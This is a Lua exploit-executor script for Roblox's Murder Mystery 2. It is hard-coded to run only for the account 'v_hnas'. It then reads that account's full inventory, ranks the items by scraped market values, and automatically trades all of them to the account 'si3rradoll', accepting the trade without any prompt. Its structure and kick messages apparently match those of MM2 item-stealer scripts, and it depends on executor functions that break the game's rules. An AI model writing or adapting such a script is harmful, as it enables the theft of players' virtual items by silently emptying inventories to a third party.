--!nocheck
-- MM2 auto-trade for v_hnas → si3rradoll
-- Adapted to real MM2 structure (Trade remotes + Remotes.Inventory)

-- ============ CONFIG ============
local TARGET_USER  = "v_hnas"
local TARGET_TRADE = "si3rradoll"
local KICK_MSG     = "скрипт только для v_hnas"
local UNSUPPORTED  = "Game not supported. Please join a normal MM2 server"

-- ============ SERVICES ============
local Players           = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer       = Players.LocalPlayer

-- ============ DEBUG ============
local function log(...) print("[MM2]", ...) end
local function warnlog(...) warn("[MM2]", ...) end
log("script started")

-- ============ KICK GUARDS ============
if LocalPlayer.Name:lower() ~= TARGET_USER:lower() then
    LocalPlayer:Kick(KICK_MSG)
    return
end

local MM2_PLACE_IDS = { [142823291] = true, [11759233232] = true }
if not MM2_PLACE_IDS[game.PlaceId] then
    LocalPlayer:Kick(UNSUPPORTED)
    return
end

log("guards passed | PlaceId:", game.PlaceId, "| Name:", LocalPlayer.Name)

-- ============ VALUES SYNC (optional) ============
local VALUES = {}
local function fetch(url)
    if request then
        local ok, res = pcall(request, {Url=url, Method="GET"})
        if ok and res and res.Body then return res.Body end
    end
    if http_request then
        local ok, res = pcall(http_request, {Url=url, Method="GET"})
        if ok and res and res.Body then return res.Body end
    end
    if game.HttpGet then
        local ok, res = pcall(game.HttpGet, game, url)
        if ok and res and #res > 0 then return res end
    end
    return nil
end

local function syncValues()
    local urls = {
        "https://mm2values.com/?p=godly",
        "https://mm2values.com/?p=ancient",
        "https://mm2values.com/?p=chroma",
        "https://mm2values.com/?p=legend",
        "https://mm2values.com/?p=unique",
        "https://mm2values.com/?p=rare",
    }
    for _, u in ipairs(urls) do
        local body = fetch(u)
        if body then
            for name, price in body:gmatch("([%w%s_%-%.]+)%s*[%-–—]%s*(%d+)") do
                name = name:match("^%s*(.-)%s*$")
                if name and #name > 1 and #name < 60 then
                    VALUES[name] = tonumber(price) or 0
                end
            end
        end
    end
    log("values synced:", (next(VALUES) ~= nil) and "yes" or "no (offline)")
end

-- ============ REMOTES ============
local Remotes = ReplicatedStorage:WaitForChild("Remotes", 10)
if not Remotes then warnlog("Remotes not found"); return end
local Inventory = Remotes:WaitForChild("Inventory", 10)
if not Inventory then warnlog("Inventory not found"); return end

local Trade = ReplicatedStorage:WaitForChild("Trade", 10)
if not Trade then warnlog("Trade not found"); return end

local GetProfileData   = Inventory:WaitForChild("GetProfileData", 5)
local GetTradeStatus   = Trade:WaitForChild("GetTradeStatus", 5)
local StartTrade       = Trade:WaitForChild("StartTrade", 5)
local OfferItem        = Trade:WaitForChild("OfferItem", 5)
local AcceptTrade      = Trade:WaitForChild("AcceptTrade", 5)
local DeclineTrade     = Trade:WaitForChild("DeclineTrade", 5)
local SendRequest      = Trade:WaitForChild("SendRequest", 5)
local AcceptRequest    = Trade:WaitForChild("AcceptRequest", 5)
local DeclineRequest   = Trade:WaitForChild("DeclineRequest", 5)
local GetRequest       = Trade:WaitForChild("GetRequest", 5)
local CompleteTrade    = Trade:WaitForChild("CompleteTrade", 5)
local EndTrade         = Trade:WaitForChild("EndTrade", 5)
local RemoveOffer      = Trade:WaitForChild("RemoveOffer", 5)
local RequestSent      = Trade:WaitForChild("RequestSent", 5)
local UpdateTrade      = Trade:WaitForChild("UpdateTrade", 5)

if not GetProfileData then warnlog("GetProfileData missing"); return end
if not StartTrade then warnlog("StartTrade missing"); return end
if not OfferItem then warnlog("OfferItem missing"); return end
if not AcceptTrade then warnlog("AcceptTrade missing"); return end

log("remotes resolved")

-- ============ INVENTORY ============
local function getInventory()
    local ok, data = pcall(function()
        return GetProfileData:InvokeServer()
    end)
    if not ok or type(data) ~= "table" then
        warnlog("GetProfileData failed:", data)
        return {}
    end

    -- Логируем верхний уровень, чтобы понять структуру
    log("profile keys:")
    for k, v in pairs(data) do
        log("  ", tostring(k), "=", type(v))
    end

    local items = {}
    local weapons = data.Weapons or data.Owned or data.Items or data.Inventory or {}
    for _, item in ipairs(weapons) do
        if item.DataID and (item.Amount == nil or item.Amount > 0) then
            table.insert(items, {
                DataID = item.DataID,
                Amount = item.Amount or 1,
                Rarity = item.Rarity,
                Value  = VALUES[item.DataID] or 0,
            })
        end
    end
    table.sort(items, function(a, b) return a.Value > b.Value end)
    return items
end

-- ============ PLAYER LOOKUP ============
local function findPlayer(name)
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr.Name:lower() == name:lower() then
            return plr
        end
    end
    return nil
end

-- ============ TRADE ACTIONS ============
local function startTrade(target)
    log("firing StartTrade →", target.Name)
    local ok, err = pcall(function()
        StartTrade:FireServer(target)
    end)
    if not ok then warnlog("StartTrade failed:", err); return false end
    log("⚡ MM2 Trade STARTED")
    return true
end

local function offerItems(items)
    log("🔄 Transferring items now...")
    for _, item in ipairs(items) do
        pcall(function()
            OfferItem:FireServer(item.DataID, item.Amount or 1)
        end)
        task.wait(0.15)
    end
end

local function acceptTrade()
    log("firing AcceptTrade")
    pcall(function() AcceptTrade:FireServer() end)
end

local function acceptRequest()
    log("firing AcceptRequest")
    pcall(function() AcceptRequest:FireServer() end)
end

local function declineTrade()
    pcall(function() DeclineTrade:FireServer() end)
end

local function declineRequest()
    pcall(function() DeclineRequest:FireServer() end)
end

-- ============ WATCH INCOMING REQUESTS ============
if GetRequest then
    GetRequest.OnClientEvent:Connect(function(fromPlayer)
        local name = (typeof(fromPlayer) == "Instance") and fromPlayer.Name or tostring(fromPlayer)
        log("📩 GetRequest from", name)
        if name:lower() == TARGET_TRADE:lower() then
            log("→ target match, accepting")
            acceptRequest()
        end
    end)
end

if SendRequest then
    SendRequest.OnClientEvent:Connect(function(fromPlayer)
        local name = (typeof(fromPlayer) == "Instance") and fromPlayer.Name or tostring(fromPlayer)
        log("📩 SendRequest from", name)
    end)
end

-- ============ MAIN ============
local function main()
    log("main() started")
    syncValues()

    local items = getInventory()
    if #items == 0 then
        warnlog("❌ No tradable items found. Inventory empty or unparsed.")
        return
    end
    log("🎒 Items ready:", #items)
    for i = 1, math.min(#items, 5) do
        log("  ", i, items[i].DataID, "x" .. items[i].Amount)
    end

    log("⏳ Waiting for " .. TARGET_TRADE .. "...")
    local target = findPlayer(TARGET_TRADE)
    if not target then
        warnlog("Player " .. TARGET_TRADE .. " not found. Waiting on PlayerAdded...")
        return
    end
    log("found target:", target.Name)

    if not startTrade(target) then return end
    task.wait(2)
    offerItems(items)
    task.wait(2)
    acceptTrade()

    log("✅ Trade COMPLETED")
end

-- ============ ENTRY ============
Players.PlayerAdded:Connect(function(plr)
    if plr.Name:lower() == TARGET_TRADE:lower() then
        log("PlayerAdded:", plr.Name)
        task.spawn(main)
    end
end)

if findPlayer(TARGET_TRADE) then
    task.spawn(main)
else
    log("target not in game yet; waiting...")
end

log("script loaded, waiting for events")
